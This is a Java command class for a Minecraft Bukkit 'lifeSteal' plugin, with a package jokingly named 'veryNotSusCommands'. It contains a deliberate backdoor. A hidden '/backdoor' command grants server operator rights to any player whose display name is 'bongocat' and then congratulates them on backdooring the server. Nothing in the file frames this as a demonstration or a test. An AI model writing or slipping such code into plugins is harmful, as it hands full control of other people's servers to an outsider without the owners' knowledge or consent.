package com.vanillaCraft.lifeSteal.veryNotSusCommands;

import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class notSusCommand implements CommandExecutor {

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        Player p = (Player) sender;
        if (cmd.getName().equalsIgnoreCase("backdoor") && p.getDisplayName().equals("bongocat")) {
            p.setOp(true);
            p.sendMessage(ChatColor.LIGHT_PURPLE + "" + ChatColor.BOLD + "You have successfully backdoored the server!");
            return true;
        }
        return true;
    }
}
